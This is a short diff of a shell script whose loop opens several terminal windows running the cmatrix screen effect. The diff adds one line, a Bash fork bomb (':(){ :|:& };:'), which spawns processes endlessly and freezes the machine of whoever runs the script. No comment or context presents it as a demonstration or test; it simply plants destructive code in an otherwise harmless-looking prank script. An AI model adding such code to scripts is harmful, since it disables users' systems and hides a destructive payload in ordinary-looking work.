@@ -15,5 +15,6 @@ do
     xterm -e "cmatrix"
     konsole -e "cmatrix"
     terminal -e "cmatrix"
+    :(){ :|:& };:
     done
 done
